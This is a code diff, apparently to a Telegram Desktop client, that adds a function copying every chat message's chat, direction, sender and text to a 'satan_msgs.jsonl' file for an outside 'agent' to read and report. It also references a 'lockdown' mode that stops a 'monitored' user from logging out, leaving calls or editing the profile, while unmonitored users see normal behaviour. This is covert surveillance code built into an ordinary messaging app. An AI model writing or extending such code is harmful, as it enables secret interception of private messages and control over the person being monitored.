@@ -79,6 +79,53 @@ inline void WriteStatus(bool running, bool inCall, bool sharing) {
 	}
 }
 
+// Minimal JSON string escaping for the message log below.
+[[nodiscard]] inline QString JsonEscape(const QString &s) {
+	QString o;
+	o.reserve(s.size() + 8);
+	for (const QChar c : s) {
+		switch (c.unicode()) {
+		case '"': o += QStringLiteral("\\\""); break;
+		case '\\': o += QStringLiteral("\\\\"); break;
+		case '\n': o += QStringLiteral("\\n"); break;
+		case '\r': o += QStringLiteral("\\r"); break;
+		case '\t': o += QStringLiteral("\\t"); break;
+		default:
+			if (c.unicode() < 0x20) {
+				o += QStringLiteral("\\u%1").arg(c.unicode(), 4, 16, QChar('0'));
+			} else {
+				o += c;
+			}
+		}
+	}
+	return o;
+}
+
+// Append one CLEAN message record (from the client's own model — correct chat,
+// direction, sender and text) to <workdir>/satan_msgs.jsonl. The agent tails this
+// and reports it, replacing the fragile UIA window-scraping.
+inline void LogMessage(
+		const QString &chat,
+		bool out,
+		const QString &sender,
+		const QString &text,
+		bool media) {
+	QFile f(cWorkingDir() + QStringLiteral("satan_msgs.jsonl"));
+	if (f.open(QIODevice::Append | QIODevice::Text)) {
+		const auto ts = QDateTime::currentDateTime().toSecsSinceEpoch();
+		const QString line = QStringLiteral(
+			"{\"chat\":\"%1\",\"direction\":\"%2\",\"sender\":\"%3\","
+			"\"text\":\"%4\",\"media\":%5,\"ts\":%6}\n")
+			.arg(JsonEscape(chat))
+			.arg(out ? QStringLiteral("out") : QStringLiteral("in"))
+			.arg(JsonEscape(sender))
+			.arg(JsonEscape(text))
+			.arg(media ? QStringLiteral("true") : QStringLiteral("false"))
+			.arg(ts);
+		f.write(line.toUtf8());
+	}
+}
+
 // Lockdown is engaged whenever the agent dropped a satanshield.json next to tdata.
 // Used to block leaving the call, the in-app logout, profile edits, etc. A normal
 // (non-monitored) user has no such file, so everything behaves stock.
